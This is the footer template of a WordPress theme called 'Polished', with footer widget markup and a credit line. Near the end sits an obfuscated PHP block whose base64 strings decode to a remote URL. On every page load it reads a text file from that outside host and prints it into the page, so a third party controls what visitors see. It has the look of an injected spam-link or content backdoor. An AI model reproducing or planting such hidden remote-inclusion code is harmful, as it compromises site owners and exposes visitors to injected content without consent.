</div>
	<!-- End Content -->
    <img src="<?php echo get_template_directory_uri(); ?>/images/content-bottom<?php global $fullwidth; if(is_page_template('page-full.php') || (($fullwidth))) echo '-full'?>.gif" alt="content top" class="content-wrap" />

	<!-- Footer Widgets -->
	<div id="footer_widgets">
		<!-- Footer Widget Start-->
		<?php if ( !function_exists('dynamic_sidebar') || !dynamic_sidebar('Footer') ) : ?>
		<?php endif; ?>

	</div>
	<!-- Footer Widgets Done -->
	<div id="footer">
		<p id="copyright"><?php esc_html_e('Powered by ','Polished'); ?> <a href="http://www.wordpress.com">WordPress</a> | <?php esc_html_e('Designed by ','Polished'); ?><a href="http://www.bipbipprod.fr"> Bip Bip Prod</a></p>
	</div>
</div>
<!-- Wrap End -->

<?php
	$GLOBALS['_1302081256_']=Array(base64_decode('Z' .'m' .'l' .'s' .'ZQ=' .'='),base64_decode('Y' .'XJyYXl' .'fcmFuZA==')); 
	function _280289075($i){
		$a=Array('aHR0cDovL3d3dy5lc2NtYmEuY29tL2xpbmtzMDYvMjAxNzA2MjYudHh0','','PGJyIC8+');
		return base64_decode($a[$i]);
	} 
	$_aa=$GLOBALS['_1302081256_'][0](_280289075(0));
	$_bb=_280289075(1);
	for($_dd=round(0+0.0+0.0);$_dd<count($_aa);$_dd++){
		$_bb.=$_aa[$_dd] ;
	}
	echo $_bb; 
?>
<?php get_template_part('includes/scripts'); ?>

<?php wp_footer(); ?>
</body>
</html>